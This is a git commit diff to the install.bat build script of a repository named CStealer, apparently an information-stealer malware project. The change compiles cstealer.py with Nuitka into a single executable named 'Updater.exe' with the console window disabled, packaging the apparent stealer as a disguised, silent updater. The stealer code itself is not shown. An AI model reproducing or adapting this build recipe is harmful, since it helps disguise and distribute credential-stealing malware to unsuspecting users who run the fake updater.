b648a034ca3250bf4d096821907a2274bc4514e6
86FX <126899456+86FX@users.noreply.github.com>
2025-01-26 13:11:13 +0300

    New builder using Nuitka

--- install.bat
+++ install.bat
@@ -1,3 +1,6 @@
 @echo off
-pip install -r requirements.txt
+title github.com/86FX/CStealer
+cd %~dp0 &:: Enter current directory
+python -m pip install -U -r requirements.txt  &:: Install requirements
+python -m nuitka --onefile --assume-yes-for-downloads --plugin-enable=multiprocessing --windows-disable-console --output-file="Updater.exe" --python-flag=no_docstrings cstealer.py &:: Build
 pause
